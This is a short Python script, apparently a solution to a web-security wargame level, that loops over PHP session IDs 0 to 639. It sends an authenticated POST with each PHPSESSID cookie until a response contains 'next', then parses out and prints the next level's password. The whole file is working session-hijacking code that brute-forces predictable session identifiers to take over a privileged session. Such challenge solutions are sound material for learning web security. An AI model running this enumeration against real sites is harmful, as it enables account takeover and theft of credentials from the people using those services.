#!/usr/bin/env python3

import requests
import base64
import re
from levels_credentials import credentials

level_url = credentials[18]["url"]
level_username = credentials[18]["level"]
level_password = credentials[18]["password"]

next_level_url = credentials[19]["url"]
next_level_username = credentials[19]["level"]

credentials = "%s:%s" % (level_username, level_password)
auth_creds = base64.b64encode(credentials.encode("ascii"))
heads = {"Authorization": "Basic %s" % auth_creds.decode("ascii"), "Referer": next_level_url}
data = {"username":"123", "password":"123"}

for i in range(0, 640):
    cooks = {"PHPSESSID": str(i)}
    response = requests.post(level_url, headers=heads, cookies=cooks)
    data = response.text

    if "next" not in response.text:
        continue
    if "next" in response.text:
        strings = re.split('\n|:|\s|<|>', data)
        next_password = strings[strings.index(next_level_username) + 3]
        print(next_password)
        break
